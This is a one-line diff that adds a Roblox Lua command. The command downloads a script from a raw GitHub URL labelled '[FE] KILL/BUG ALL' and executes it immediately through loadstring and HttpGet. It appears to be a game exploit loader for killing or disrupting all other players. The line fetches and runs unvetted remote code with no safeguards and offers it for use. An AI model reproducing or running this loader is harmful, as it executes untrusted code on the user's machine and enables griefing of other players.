@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Dan41/Scripts/main/%5BFE%5D%20KILL/BUG%20ALL.lua'),true))()
